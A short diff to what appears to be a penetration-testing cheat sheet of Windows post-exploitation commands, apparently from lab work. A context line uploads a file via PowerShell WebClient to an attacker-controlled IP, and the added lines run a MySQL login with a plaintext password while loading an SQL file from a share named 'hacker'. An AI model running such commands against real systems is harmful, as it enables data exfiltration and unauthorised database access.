@@ -107,6 +107,11 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.199/
 C:\WINDOWS\sysnative\WindowsPowerShell\v1.0\powershell.exe
 C:\WINDOWS\syswow64\WindowsPowerShell\v1.0\powershell.exe
 ```
+
+### Local mysql
+```
+mysql --user="dbuser" --database="sniper" --password="36mEAhz/B8xQ~2VM" < \\10.10.14.6\hacker\test.sql
+```
 ## Common Vuln
 ### Weak service permission
 How to spot
